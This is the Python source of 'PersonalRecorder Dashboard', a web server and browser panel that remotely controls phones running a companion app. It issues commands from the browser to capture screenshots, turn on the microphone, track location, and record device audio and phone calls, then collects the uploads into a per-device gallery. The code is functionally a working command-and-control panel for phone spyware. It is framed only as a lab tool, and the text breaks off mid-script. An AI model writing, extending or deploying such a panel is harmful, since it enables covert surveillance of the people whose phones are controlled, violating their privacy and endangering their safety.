#!/usr/bin/env python3
"""PersonalRecorder Dashboard — the browser monitor for the lab.

Replaces the plain terminal relay (relay_server.py) with a website:

  * live event feed (screenshots, location, recording events, acks)
  * gallery for screenshots, video (mp4) and audio (m4a/wav) uploads
  * live location table + offline plot
  * Devices tab: every APK that ever connected is listed here, so you can
    see which phones are paired and target commands at one of them
  * command panel: push capture / mic / location / record / deviceaudio
    straight from the browser (same queue + ack flow as send_command.py)
  * per-device command queue: pick a device in the UI, commands are
    delivered to that phone now -- or when it comes back online
  * optional token login for the UI and the command channel

The app announces itself with {"type": "device_online", payload: {id, name}}
on every WS open (RealtimeClient.onOpen). Without an explicit id the device
falls into the shared "default" bucket, which keeps legacy clients working.
Commands carry {"type": ..., "to": <device-id>}; a command without `to`
targets the only known device (or the default bucket when in doubt). Media
files (screenshots, uploads) are tagged with the sending device ("dev"), and
/api/files?dev=<id> filters the gallery per phone.

Usage:
    pip install aiohttp
    python3 dashboard.py --port 8765 --out ./data
    # password-protect the UI + commands (recommended for a VPS):
    python3 dashboard.py --port 8765 --token changeme
    # TLS (wss) with the lab CA from gen_cert.sh:
    python3 dashboard.py --port 8765 --cert certs/server.pem --key certs/server.key

Then point the app at ws://<this-host>:8765/ws (or wss://.../ws)
and open http://<this-host>:8765 in a browser. No local terminal needed
on the monitoring side besides starting this server once (or a VPS).
"""
from __future__ import annotations

import argparse
import asyncio
import base64
import binascii
import hashlib
import hmac
import json
import os
import pathlib
import re
import ssl
import time
import uuid
from collections import deque
from typing import Optional

import aiohttp
from aiohttp import web

# ---------------------------------------------------------------------------
# Command protocol (same as relay_server.py: forward, queue while offline, ack)
# ---------------------------------------------------------------------------
COMMAND_TYPES = {
    "capture",
    "mic_start", "mic_stop",
    "location_start", "location_stop",
    "record_start", "record_stop",
    "deviceaudio_start", "deviceaudio_stop",
    "call_video_start", "call_video_stop",
    "call_audio_start", "call_audio_stop",
}
PENDING_TTL_SECONDS = 300
DEVICE_WS_PATH = "/ws"       # the app connects here
UI_WS_PATH = "/ws/ui"        # a browser tab connects here

# ---------------------------------------------------------------------------
# Global state
# ---------------------------------------------------------------------------
# Registered devices: id -> {id, name, remote, ws, online, first_seen, last_seen}
# Persisted to devices.json so phones that once connected stay listed in the
# Devices tab even while offline or after a dashboard restart.
devices: dict[str, dict] = {}
queues: dict[str, list[dict]] = {}   # device id -> pending commands (TTL per entry)
ANONYMOUS_DEV = "default"            # legacy devices without an id share this bucket
ui_clients: set[web.WebSocketResponse] = set()
event_ring: deque = deque(maxlen=500)
locations: list[dict] = []
last_location: Optional[dict] = None
started_at = time.time()

args_holder: argparse.Namespace | None = None
secret = uuid.uuid4().hex  # used for the session cookie (random per run)


def log(line: str) -> None:
    print(f"[{time.strftime('%H:%M:%S')}] {line}", flush=True)


async def _ui_send(ws: web.WebSocketResponse, text: str) -> None:
    try:
        await ws.send_str(text)
    except Exception:
        ui_clients.discard(ws)


def broadcast_ui(text: str) -> None:
    """Fire-and-forget push to every open browser tab.
    send_str is a coroutine, so it must be scheduled on the running loop
    (all callers are aiohttp handlers) rather than called bare."""
    for ws in list(ui_clients):
        asyncio.ensure_future(_ui_send(ws, text))


def push_event(mtype: str, payload: dict | None = None, ts: int | None = None) -> dict:
    ev = {"type": mtype, "payload": payload or {}, "ts": ts or int(time.time() * 1000)}
    event_ring.append(ev)
    broadcast_ui(json.dumps({"type": "ev", "event": ev}))
    return ev


# ---------------------------------------------------------------------------
# Device registry (multi-device: every installed APK shows up in the dashboard)
# ---------------------------------------------------------------------------
def load_devices(data_dir: pathlib.Path) -> None:
    f = data_dir / "devices.json"
    if f.exists():
        try:
            for rec in json.loads(f.read_text()):
                rec.pop("ws", None)
                rec["online"] = False
                devices[rec["id"]] = rec
        except Exception:
            pass


def save_devices(data_dir: pathlib.Path) -> None:
    try:
        (data_dir / "devices.json").write_text(
            json.dumps(list(devices.values()), indent=1))
    except Exception:
        pass


def register_device(dev_id: str, name: str, remote: str) -> dict:
    now = time.time()
    dev = devices.get(dev_id)
    if dev is None:
        dev = {"id": dev_id, "name": name or dev_id, "remote": remote, "ws": None,
               "online": False, "first_seen": now, "last_seen": now}
        devices[dev_id] = dev
    else:
        dev["name"] = name or dev.get("name") or dev_id
        dev["remote"] = remote
        dev["last_seen"] = now
    return dev


def set_device_online(dev_id: str, ws: web.WebSocketResponse, remote: str) -> None:
    dev = devices.get(dev_id)
    if dev is not None:
        dev["ws"] = ws
        dev["online"] = True
        dev["remote"] = remote
        dev["last_seen"] = time.time()


def set_device_offline(dev_id: str) -> None:
    dev = devices.get(dev_id)
    if dev is not None:
        dev["ws"] = None
        dev["online"] = False


def device_queue(dev_id: str) -> list[dict]:
    q = queues.get(dev_id)
    if q is None:
        q = []
        queues[dev_id] = q
    return q


def resolve_target(to: str | None) -> str:
    """Where a command without an explicit `to` goes: the single known device,
    the legacy anonymous device, or the anonymous bucket if none is known."""
    if to:
        return to
    known = sorted(devices, key=lambda d: devices[d].get("first_seen", 0))
    if len(known) == 1:
        return known[0]
    return ANONYMOUS_DEV


def devices_summary() -> list[dict]:
    now = time.time()
    out = []
    for dev_id in sorted(devices, key=lambda d: devices[d].get("first_seen", 0)):
        d = devices[dev_id]
        out.append({
            "id": d["id"],
            "name": d.get("name", d["id"]),
            "online": d["online"],
            "remote": d.get("remote"),
            "first_seen": d.get("first_seen"),
            "last_seen": d.get("last_seen"),
            "pending": len([c for c in device_queue(d["id"])
                             if now - c["ts"] <= PENDING_TTL_SECONDS]),
        })
    return out


def devices_online_count() -> int:
    return sum(1 for d in devices.values() if d.get("online"))


def pending_total() -> int:
    """Total undelivered commands across every device queue (TTL-aware)."""
    now = time.time()
    return sum(1 for q in queues.values()
               for c in q if now - c["ts"] <= PENDING_TTL_SECONDS)


def status_payload() -> dict:
    holder = args_holder
    online = devices_online_count()
    return {
        "type": "status",
        "device_online": online > 0,   # legacy bool: >=1 device online
        "devices_online": online,       # new: how many phones are up
        "devices": devices_summary(),   # new: full per-device registry list
        "queue": pending_total(),
        "token_locked": bool(holder is not None and holder.token),
        "uptime_s": int(time.time() - started_at),
        "last_location": last_location,
    }


# ---------------------------------------------------------------------------
# Media index (db.json) + helpers
# ---------------------------------------------------------------------------
def load_index(data_dir: pathlib.Path) -> list[dict]:
    idx_file = data_dir / "db.json"
    if idx_file.exists():
        try:
            return json.loads(idx_file.read_text())
        except Exception:
            pass
    return []


def save_index(data_dir: pathlib.Path, index: list[dict]) -> None:
    (data_dir / "db.json").write_text(json.dumps(index, indent=1))


def index_media(data_dir: pathlib.Path, kind: str, rel_path: str, size: int,
                meta: dict | None = None, dev: str | None = None,
                dev_name: str | None = None,
                category: str | None = None) -> dict:
    """Add a file entry to db.json and broadcast it to open browsers.
    `dev`/`dev_name` tag which device produced the file, so the gallery can
    be filtered per phone (/api/files?dev=<id>). `category` is an optional
    sub-tag ("call_video", "call_audio") that splits recordings into the
    dedicated Video calls / Audio calls sections."""
    # rel_path is stored relative to data_dir (e.g. "media/img/x.jpg"); the
    # served URL must be /media/<sub>/<name>, so strip a redundant media/ prefix.
    rel = rel_path.replace(pathlib.Path(rel_path).anchor, "")
    if rel.startswith("media/"):
        rel = rel[len("media/"):]
    entry = {
        "id": uuid.uuid4().hex[:12],
        "kind": kind,
        "name": pathlib.Path(rel_path).name,
        "url": f"/media/{rel}",
        "rel": rel_path,
        "size": size,
        "ts": int(time.time() * 1000),
        "meta": meta or {},
        "dev": dev,
        "dev_name": dev_name,
        "category": category,
    }
    idx = load_index(data_dir)
    idx.append(entry)
    save_index(data_dir, idx)
    broadcast_ui(json.dumps({"type": "file", "file": entry}))
    return entry


def ensure_dirs(data_dir: pathlib.Path) -> None:
    for sub in ("img", "video", "audio"):
        (data_dir / "media" / sub).mkdir(parents=True, exist_ok=True)
    data_dir.mkdir(parents=True, exist_ok=True)


def sanitize_name(name: str) -> str:
    name = re.sub(r"[^A-Za-z0-9._-]", "_", name)
    return name[:120] or "file"


# ---------------------------------------------------------------------------
# Auth
# ---------------------------------------------------------------------------
def cookie_value() -> str:
    return hmac.new(secret.encode(), b"session", hashlib.sha256).hexdigest()


def authorized(request: web.Request) -> bool:
    holder = args_holder
    if holder is None or not holder.token:
        return True
    cookie = request.cookies.get("session", "")
    if hmac.compare_digest(cookie, cookie_value()):
        return True
    return request.query.get("token") == holder.token


def check_auth(request: web.Request) -> None:
    if not authorized(request):
        raise web.HTTPFound("/login" if request.method == "GET" else "/api/denied")


# ---------------------------------------------------------------------------
# Device WebSocket handler (the phone / send_command.py clients)
# ---------------------------------------------------------------------------
async def flush_queue(ws: web.WebSocketResponse, dev_id: str) -> None:
    """Deliver every pending command for this device now that it is online.
    Expired entries (TTL) are dropped, undeliverable ones stay queued."""
    if dev_id not in queues:
        return
    now = time.time()
    still: list[dict] = []
    for cmd in queues[dev_id]:
        if now - cmd["ts"] > PENDING_TTL_SECONDS:
            log(f"queue: dropped expired '{cmd['type']}' (-> {dev_id})")
            continue
        try:
            await ws.send_str(json.dumps({"type": cmd["type"]}))
            log(f"> delivered queued command '{cmd['type']}' to {dev_id} (was offline)")
        except Exception:
            still.append(cmd)
    queues[dev_id] = still


async def handle_command(ws: web.WebSocketResponse, msg: dict) -> None:
    """A commander (browser UI or send_command.py) pushed a command. The command
    is routed to the device named by `to` (the Web UI always sends it); without
    `to` it falls back to the only known device or the legacy default bucket."""
    cmd = msg.get("type")
    if cmd not in COMMAND_TYPES:
        return
    target = resolve_target(msg.get("to"))
    dev = devices.get(target)
    target_ws = dev["ws"] if dev else None
    if target_ws is None or target_ws.closed:
        q = device_queue(target)
        q.append({"type": cmd, "ts": time.time()})
        log(f"queue: {target} offline -- '{cmd}' queued ({len(q)} pending)")
        await ws.send_str(json.dumps({"type": "cmd_accepted", "queued": True,
                                      "cmd": cmd, "to": target, "pending": len(q)}))
        return
    try:
        await target_ws.send_str(json.dumps({"type": cmd}))
        await ws.send_str(json.dumps({"type": "cmd_accepted", "queued": False,
                                      "cmd": cmd, "to": target}))
        log(f"> forwarded command '{cmd}' to device {target}")
    except Exception as exc:
        log(f"! forward to device failed: {exc}")


async def device_ws_handler(request: web.Request) -> web.WebSocketResponse:
    holder = args_holder
    if holder is not None and holder.token and request.query.get("token") != holder.token:
        return web.Response(status=401, text="invalid token")
    ws = web.WebSocketResponse(heartbeat=25)
    await ws.prepare(request)

    # A socket is a phone until it sends a COMMAND_TYPES message. The first
    # non-command message (usually the device_online announce carrying id+name)
    # registers the device and claims this socket for it, so several phones can
    # stay connected at once and each one only receives its own queue.
    my_dev: str | None = None
    log(f"+ ws client from {request.remote}")
    global last_location
    data_dir = request.app["data_dir"]

    async for msg in ws:
        if msg.type != aiohttp.WSMsgType.TEXT:
            if msg.type == aiohttp.WSMsgType.ERROR:
                log(f"! ws error: {ws.exception()}")
            break
        try:
            data = json.loads(msg.data)
        except json.JSONDecodeError:
            log(f"! non-JSON ignored: {msg.data[:120]!r}")
            continue

        mtype = data.get("type", "?")
        payload = data.get("payload") or {}
        ts = data.get("ts")

        if mtype in COMMAND_TYPES:
            # commander (send_command.py or a UI tab sharing the /ws socket)
            await handle_command(ws, data)
            continue

        # everything else: this socket is a phone -- register it now if needed
        if my_dev is None:
            pdev = payload if isinstance(payload, dict) else {}
            dev_id = str(pdev.get("id") or ANONYMOUS_DEV).strip() or ANONYMOUS_DEV
            name = str(pdev.get("name") or "").strip()
            register_device(dev_id, name, str(request.remote))
            set_device_online(dev_id, ws, str(request.remote))
            my_dev = dev_id
            save_devices(data_dir)
            log(f"+ device online [{dev_id}] {name} from {request.remote}")
            push_event("device_online", {"id": dev_id, "name": name})
            queued = len(device_queue(dev_id))
            if queued:
                log(f"  -- {queued} queued command(s) for {dev_id} to deliver")
            await flush_queue(ws, dev_id)

        dev_name = devices.get(my_dev, {}).get("name", my_dev)

        if mtype in ("device_online", "device_offline"):
            continue

        if mtype == "screenshot":
            raw_b64 = payload.get("data", "")
            if raw_b64:
                try:
                    raw = base64.b64decode(raw_b64)
                    fname = f"shot_{ts or int(time.time() * 1000)}.jpg"
                    target = data_dir / "media" / "img" / fname
                    target.write_bytes(raw)
                    index_media(data_dir, "img", f"media/img/{fname}", len(raw),
                                {"w": payload.get("width"), "h": payload.get("height"),
                                 "src": payload.get("path")},
                                dev=my_dev, dev_name=dev_name)
                    log(f"* screenshot saved {target.name} ({len(raw)} bytes) [{my_dev}]")
                    push_event("screenshot", {"name": target.name, "size": len(raw), "dev": my_dev})
                except (binascii.Error, ValueError) as exc:
                    log(f"! screenshot bad payload: {exc}")
            continue

        if mtype == "location":
            loc = {"lat": payload.get("lat"), "lon": payload.get("lon"),
                   "accuracy": payload.get("accuracy"), "ts": ts or int(time.time() * 1000),
                   "dev": my_dev}
            locations.append(loc)
            last_location = loc
            (data_dir / "locations.jsonl").open("a").write(json.dumps(loc) + "\n")
            push_event("location", loc, loc["ts"])
            log(f"* location lat={loc['lat']} lon={loc['lon']} acc={loc['accuracy']} [{my_dev}]")
            continue

        if mtype == "ack":
            log(f"* ack from {my_dev}: {payload.get('cmd')}")
            push_event("ack", payload, ts)

        # everything else: generic event (capture_started, recording_*, ...)
        log(f"* event {mtype} [{my_dev}]: {payload}")
        push_event(mtype, payload, ts)

    if my_dev is not None:
        set_device_offline(my_dev)
        save_devices(data_dir)
        log(f"- device offline [{my_dev}] -- commands will be queued")
        push_event("device_offline", {"id": my_dev, "name": devices.get(my_dev, {}).get("name")})
    else:
        log("- ws client gone")
    return ws


# ---------------------------------------------------------------------------
# UI WebSocket: live events out, commands in
# ---------------------------------------------------------------------------
async def ui_ws_handler(request: web.Request) -> web.WebSocketResponse:
    if not authorized(request):
        raise web.HTTPFound("/login")
    ws = web.WebSocketResponse(heartbeat=25)
    await ws.prepare(request)
    ui_clients.add(ws)
    log(f"+ browser ui {request.remote}")
    try:
        await ws.send_str(json.dumps({"type": "hello", "version": 1}))
        await status_push(ws)
        async for msg in ws:
            if msg.type != aiohttp.WSMsgType.TEXT:
                break
            try:
                data = json.loads(msg.data)
            except json.JSONDecodeError:
                continue
            if data.get("type") in COMMAND_TYPES:
                await handle_command(ws, data)
            elif data.get("type") == "ping":
                await status_push(ws)
    finally:
        ui_clients.discard(ws)
        log(f"- browser ui gone ({request.remote})")
    return ws


async def status_push(ws: web.WebSocketResponse) -> None:
    await ws.send_str(json.dumps(status_payload()))


# ---------------------------------------------------------------------------
# HTTP routes
# ---------------------------------------------------------------------------
async def index_page(request: web.Request) -> web.Response:
    check_auth(request)
    return web.Response(content_type="text/html", text=INDEX_HTML)


LOGIN_HTML = """<!doctype html><html><head><meta charset="utf-8">
<title>PersonalRecorder login</title>
<style>body{font-family:ui-monospace,Menlo,monospace;background:#0f1117;color:#e6e6e6;display:flex;height:100vh;margin:0;align-items:center;justify-content:center}
form{background:#1a1e29;padding:2rem;border-radius:12px;display:flex;flex-direction:column;gap:.8rem;min-width:260px}
input{padding:.6rem;border-radius:8px;border:1px solid #334;background:#0f1117;color:#fff;font-size:1rem}
button{padding:.6rem;border-radius:8px;border:0;background:#3b82f6;color:#fff;cursor:pointer;font-size:1rem}
.err{color:#f87171;font-size:.85rem}</style></head><body>
<form method="post" action="/login">
  <h2 style="margin:0">PersonalRecorder</h2>
  <div style="color:#94a3b8;font-size:.85rem">This monitor is protected by a token.</div>
  <input type="password" name="token" placeholder="access token" autofocus>
  <button type="submit">Unlock</button>
  <div class="err" id="err"></div>
</form>
<script>if(location.search.includes('bad'))document.getElementById('err').textContent='wrong token';</script>
</body></html>"""


async def login(request: web.Request) -> web.Response:
    holder = args_holder
    if request.method == "POST":
        form = await request.post()
        if holder is not None and holder.token and form.get("token") == holder.token:
            resp = web.HTTPFound("/")
            resp.set_cookie("session", cookie_value(), httponly=True, samesite="Lax",
                            max_age=60 * 60 * 24 * 7)
            raise resp
        raise web.HTTPFound("/login?bad=1")
    if holder is None or not holder.token:
        raise web.HTTPFound("/")
    return web.Response(content_type="text/html", text=LOGIN_HTML)


async def logout(request: web.Request) -> web.Response:
    resp = web.HTTPFound("/login")
    resp.del_cookie("session")
    raise resp


async def api_files(request: web.Request) -> web.Response:
    check_auth(request)
    kind = request.query.get("kind")
    dev = request.query.get("dev")
    category = request.query.get("category")
    idx = load_index(request.app["data_dir"])
    if kind:
        idx = [e for e in idx if e.get("kind") == kind]
    if dev:
        idx = [e for e in idx if (e.get("dev") or "") == dev]
    if category:
        idx = [e for e in idx if (e.get("category") or "") == category]
    idx.sort(key=lambda e: e.get("ts", 0), reverse=True)
    return web.json_response(idx)


async def api_locations(request: web.Request) -> web.Response:
    check_auth(request)
    return web.json_response({"locations": locations[-200:], "last": last_location})


async def api_status(request: web.Request) -> web.Response:
    check_auth(request)
    out = status_payload()
    out.pop("type", None)
    return web.json_response(out)


async def api_devices(request: web.Request) -> web.Response:
    check_auth(request)
    return web.json_response({"devices": devices_summary(),
                              "devices_online": devices_online_count(),
                              "total_pending": pending_total()})


async def api_events(request: web.Request) -> web.Response:
    check_auth(request)
    limit = int(request.query.get("limit", 200))
    return web.json_response(list(event_ring)[-limit:])


async def api_denied(request: web.Request) -> web.Response:
    return web.json_response({"error": "auth required"}, status=401)


async def media_file(request: web.Request) -> web.Response:
    check_auth(request)
    sub, name = request.match_info["sub"], request.match_info["name"]
    if sub not in ("img", "video", "audio"):
        raise web.HTTPNotFound()
    path = request.app["data_dir"] / "media" / sub / name
    if not path.is_file():
        raise web.HTTPNotFound()
    return web.FileResponse(path)


async def upload_handler(request: web.Request) -> web.Response:
    """App POSTs recorded files here: multipart form (type, name, file).
    Parts are streamed in any order: the file bytes are buffered to a temp
    file, and the final destination is chosen once `type` is known."""
    if not authorized(request) and request.query.get("token") != (args_holder.token if args_holder and args_holder.token else ""):
        # token mode: allow the app to upload only when it carries the token
        if args_holder is None or not args_holder.token:
            pass
        else:
            return web.json_response({"ok": False, "error": "auth"}, status=401)
    kind: str | None = None
    name = "file"
    size = 0
    dev = None          # multipart part "dev" = device id that uploaded the file
    category = None     # multipart part "category" = call_video / call_audio / ...
    tmp: pathlib.Path | None = None
    data_dir = request.app["data_dir"]
    reader = await request.multipart()
    while True:
        part = await reader.next()
        if part is None:
            break
        if part.name == "type":
            kind = (await part.read()).decode().strip()
        elif part.name == "name":
            name = (await part.read()).decode().strip()
        elif part.name == "dev":
            dev = (await part.read()).decode().strip() or None
        elif part.name == "category":
            category = (await part.read()).decode().strip() or None
        elif part.name == "file":
            if tmp is None:
                tmp = data_dir / (f".upload_tmp_{os.getpid()}_{uuid.uuid4().hex[:8]}")
            with tmp.open("wb") as out:
                while True:
                    chunk = await part.read_chunk(65536)
                    if not chunk:
                        break
                    out.write(chunk)
                    size += len(chunk)
    if tmp is None:
        return web.json_response({"ok": False, "error": "no file part"}, status=400)
    if kind not in ("video", "audio"):
        tmp.unlink(missing_ok=True)
        return web.json_response({"ok": False, "error": "unknown type"}, status=400)
    kind_sub = "video" if kind == "video" else "audio"
    fname = f"{int(time.time() * 1000)}_{sanitize_name(name)}"
    dest = data_dir / "media" / kind_sub / fname
    dest.parent.mkdir(parents=True, exist_ok=True)
    tmp.replace(dest)
    dev_name = devices.get(dev, {}).get("name") if dev else None
    entry = index_media(data_dir, kind_sub, dest.relative_to(data_dir).as_posix(), size,
                        dev=dev, dev_name=dev_name, category=category)
    log(f"* upload {kind_sub} '{dest.name}' ({size} bytes) from {request.remote}"
        + (f" [{dev}]" if dev else "")
        + (f" [{category}]" if category else ""))
    push_event("media_uploaded", {"path": dest.name, "kind": kind_sub, "size": size, "dev": dev,
                                  "category": category})
    return web.json_response({"ok": True, "file": entry})


# ---------------------------------------------------------------------------
# App
# ---------------------------------------------------------------------------
def main() -> None:
    global args_holder, secret
    parser = argparse.ArgumentParser(description="PersonalRecorder dashboard (web monitor + relay)")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8765)
    parser.add_argument("--out", type=pathlib.Path, default=pathlib.Path("./data"))
    parser.add_argument("--token", default=None, help="password for the web UI + command channel")
    parser.add_argument("--cert", default=None, help="server.pem from gen_cert.sh (enables wss)")
    parser.add_argument("--key", default=None, help="server.key from gen_cert.sh")
    args_holder = parser.parse_args()

    ensure_dirs(args_holder.out)
    (args_holder.out / "locations.jsonl").touch(exist_ok=True)

    app = web.Application()
    app["data_dir"] = args_holder.out
    load_devices(args_holder.out)   # phones that ever connected stay listed

    app.router.add_get("/", index_page)
    app.router.add_get("/login", login)
    app.router.add_post("/login", login)
    app.router.add_get("/logout", logout)
    app.router.add_get("/ws", device_ws_handler)
    app.router.add_get("/ws/ui", ui_ws_handler)
    app.router.add_post("/upload", upload_handler)
    app.router.add_get("/media/{sub}/{name}", media_file)
    app.router.add_get("/api/files", api_files)
    app.router.add_get("/api/locations", api_locations)
    app.router.add_get("/api/status", api_status)
    app.router.add_get("/api/devices", api_devices)
    app.router.add_get("/api/events", api_events)
    app.router.add_get("/api/denied", api_denied)

    ssl_ctx = None
    scheme = "ws"
    if args_holder.cert and args_holder.key:
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_ctx.load_cert_chain(args_holder.cert, args_holder.key)
        scheme = "wss"

    print(f"[*] dashboard on {scheme}://{args_holder.host}:{args_holder.port}")
    print(f"[*] data dir: {args_holder.out.resolve()}")
    print(f"[*] app connects to: {scheme}://<host>:{args_holder.port}/ws"
          + (f"?token=..." if args_holder.token else ""))
    print(f"[*] open the UI in a browser: {'http' if not ssl_ctx else 'https'}://<host>:{args_holder.port}/")
    if args_holder.token:
        print("[*] UI + commands protected by token (login page)")
    web.run_app(app, host=args_holder.host, port=args_holder.port, ssl_context=ssl_ctx,
                print=None)


INDEX_HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PersonalRecorder — monitor</title>
<style>
:root{--bg:#0f1117;--panel:#161a24;--panel2:#1c2230;--line:#2a3348;--txt:#e6e9f0;--dim:#8fa1c0;--acc:#3b82f6;--ok:#22c55e;--warn:#f59e0b;--err:#ef4444}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--txt);
font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:14px}
header{display:flex;align-items:center;gap:14px;padding:10px 18px;background:var(--panel);
border-bottom:1px solid var(--line);position:sticky;top:0;z-index:5;flex-wrap:wrap}
header h1{font-size:16px;margin:0;letter-spacing:.5px}
.pill{padding:3px 10px;border-radius:99px;font-size:12px;border:1px solid var(--line);color:var(--dim)}
.pill.on{color:var(--ok);border-color:var(--ok)}
.pill.off{color:var(--err);border-color:var(--err)}
nav{display:flex;gap:6px;margin-left:auto}
nav button{background:transparent;color:var(--dim);border:1px solid var(--line);border-radius:8px;
padding:6px 12px;cursor:pointer;font-size:13px}
nav button.active{color:#fff;background:var(--acc);border-color:var(--acc)}
main{padding:16px;max-width:1400px;margin:0 auto}
#log{height:260px;overflow:auto;background:var(--panel);border:1px solid var(--line);border-radius:10px;
padding:10px;font-size:12px;line-height:1.6;white-space:pre-wrap;word-break:break-all}
#log .t{color:var(--dim)}#log .bad{color:var(--err)}#log .good{color:var(--ok)}
.cmdbar{display:flex;gap:8px;flex-wrap:wrap;margin:14px 0}
.cmd{background:var(--panel2);border:1px solid var(--line);color:var(--txt);border-radius:9px;
padding:8px 14px;cursor:pointer;font-size:13px;transition:all .12s}
.cmd:hover{border-color:var(--acc)}
.cmd.active{background:var(--acc);border-color:var(--acc);color:#fff}
.cmd:disabled{opacity:.45;cursor:not-allowed}
.devsel{padding:8px 12px;border-radius:9px;border:1px solid var(--line);background:var(--panel2);color:var(--txt);font-size:13px;font-family:inherit;cursor:pointer;max-width:230px}
.devsel:focus{outline:none;border-color:var(--acc)}
.devcard{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px;margin-bottom:10px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
.devcard .nm{font-weight:600}
.devcard .meta{font-size:11px;color:var(--dim)}
.devcard .dot{width:9px;height:9px;border-radius:50%;background:var(--dim);flex:none}
.devcard .dot.on{background:var(--ok);box-shadow:0 0 6px var(--ok)}
.devcard .dot.off{background:var(--err)}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px}
.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;overflow:hidden;cursor:pointer}
.card img{width:100%;display:block;aspect-ratio:4/3;object-fit:cover}
.card .cap{padding:6px 8px;font-size:11px;color:var(--dim);display:flex;justify-content:space-between}
.card.media{cursor:default}
.card video,.card audio{width:100%;display:block;background:#000}
.media-list{display:flex;flex-direction:column;gap:10px}
.media-item{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:10px}
.media-item .meta{font-size:11px;color:var(--dim);margin-top:6px}
table{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:10px;overflow:hidden}
th,td{padding:8px 10px;text-align:left;font-size:12px;border-bottom:1px solid var(--line)}
th{color:var(--dim);font-weight:600;background:var(--panel2)}
#map{cursor:crosshair}
#lightbox{position:fixed;inset:0;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;z-index:50}
#lightbox img{max-width:94vw;max-height:92vh;border-radius:6px}
#lightbox.on{display:flex}
.empty{color:var(--dim);padding:24px;text-align:center}
a{color:var(--acc)}
@media(max-width:760px){header{gap:8px}nav{margin-left:0;width:100%;overflow-x:auto}}
</style>
</head>
<body>
<header>
  <h1>◎ PersonalRecorder</h1>
  <span id="pDevice" class="pill off">0/0 devices online</span>
  <span id="pQueue" class="pill">queue 0</span>
  <span class="pill" id="pUptime"></span>
  <a href="/logout" style="font-size:12px;color:var(--dim)">logout</a>
  <nav>
    <button data-tab="img" class="active">Screenshots</button>
    <button data-tab="video">Videos</button>
    <button data-tab="audio">Audio</button>
    <button data-tab="call_video">Video calls</button>
    <button data-tab="call_audio">Audio calls</button>
    <button data-tab="location">Location</button>
    <button data-tab="devices">Devices</button>
    <button data-tab="log">Live log</button>
  </nav>
</header>
<main>
  <div class="cmdbar" id="cmds">
    <select id="pTarget" class="devsel" title="target device for the commands below"></select>
    <button class="cmd" data-cmd="capture">📷 Screenshot now</button>
    <button class="cmd" data-cmd="mic_start">🎙 Mic on</button>
    <button class="cmd" data-cmd="mic_stop" disabled>Mic off</button>
    <button class="cmd" data-cmd="location_start">📍 Location on</button>
    <button class="cmd" data-cmd="location_stop" disabled>Location off</button>
    <button class="cmd" data-cmd="record_start">⏺ Record on</button>
    <button class="cmd" data-cmd="record_stop" disabled>Record off</button>
    <button class="cmd" data-cmd="deviceaudio_start">🔊 Device audio on</button>
    <button class="cmd" data-cmd="deviceaudio_stop" disabled>Device audio off</button>
    <button class="cmd" data-cmd="call_video_start">📹 Video call on</button>
    <button class="cmd" data-cmd="call_video_stop" disabled>Video call off</button>
    <button class="cmd" data-cmd="call_audio_start">📞 Audio call on</button>
    <button class="cmd" data-cmd="call_audio_stop" disabled>Audio call off</button>
  </div>
  <div id="wrap"></div>
</main>
<div id="lightbox"><img id="lightboxImg" alt=""></div>
<script>
const $=id=>document.getElementById(id);
const wrap=$('wrap');const logEl=$('log');
const TABS={img:'Screenshots',video:'Videos',audio:'Audio',call_video:'Video calls',call_audio:'Audio calls',location:'Location',devices:'Devices',log:'Live log'};
let tab='img';

/* ---------- tabs openers (called on demand) ---------- */
async function openTab(name){
  tab=name;
  document.querySelectorAll('nav button').forEach(b=>b.classList.toggle('active',b.dataset.tab===name));
  if(name==='img'){wrap.innerHTML='<div class="empty">loading…</div>';wrap.innerHTML='';renderImgs(await fetchJSON('/api/files?kind=img'));}
  if(name==='video'){wrap.innerHTML='<div class="empty">loading…</div>';renderVideos(await fetchJSON('/api/files?kind=video'));}
  if(name==='audio'){wrap.innerHTML='<div class="empty">loading…</div>';renderAudios(await fetchJSON('/api/files?kind=audio'));}
  if(name==='call_video'){wrap.innerHTML='<div class="empty">loading…</div>';renderCallVideos(await fetchJSON('/api/files?kind=video&category=call_video'));}
  if(name==='call_audio'){wrap.innerHTML='<div class="empty">loading…</div>';renderCallAudios(await fetchJSON('/api/files?kind=audio&category=call_audio'));}
  if(name==='location'){renderLocations();}
  if(name==='devices'){renderDevices();}
  if(name==='log'){wrap.innerHTML='<div id="log"></div>';logEl=$('log');copyLog();}
}
async function fetchJSON(u){try{const r=await fetch(u);return r.ok?await r.json():[];}catch(e){return [];}}
/* ---------- devices ---------- */
function esc(s){return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
let lastDevices=[];
async function refreshDevices(){const d=await fetchJSON('/api/devices');lastDevices=d.devices||[];renderTargets(lastDevices);if(tab==='devices')renderDevices(lastDevices);}
async function renderDevices(list){
  const devs=list||lastDevices;
  wrap.innerHTML='';
  if(!devs.length){wrap.innerHTML='<div class="empty">no devices yet — install the APK and open it once; every phone that connects shows up here permanently</div>';return;}
  for(const d of devs){
    const c=document.createElement('div');c.className='devcard';
    const dot=document.createElement('span');dot.className='dot '+(d.online?'on':'off');
    const nm=document.createElement('span');nm.className='nm';nm.textContent=d.name;
    const meta=document.createElement('span');meta.className='meta';
    meta.textContent=`${d.id} · ${d.online?'online':'offline'} · first seen ${d.first_seen?new Date(d.first_seen*1000).toLocaleString():'—'} · ${d.pending} queued`;
    const btns=document.createElement('span');btns.style.cssText='margin-left:auto;display:flex;gap:6px';
    ['capture','mic_start','location_start','record_start','deviceaudio_start','call_video_start','call_audio_start'].forEach(a=>{
      const b=document.createElement('button');b.className='cmd';b.textContent=a.replace('_start','');
      b.style.cssText='padding:5px 10px;font-size:12px';
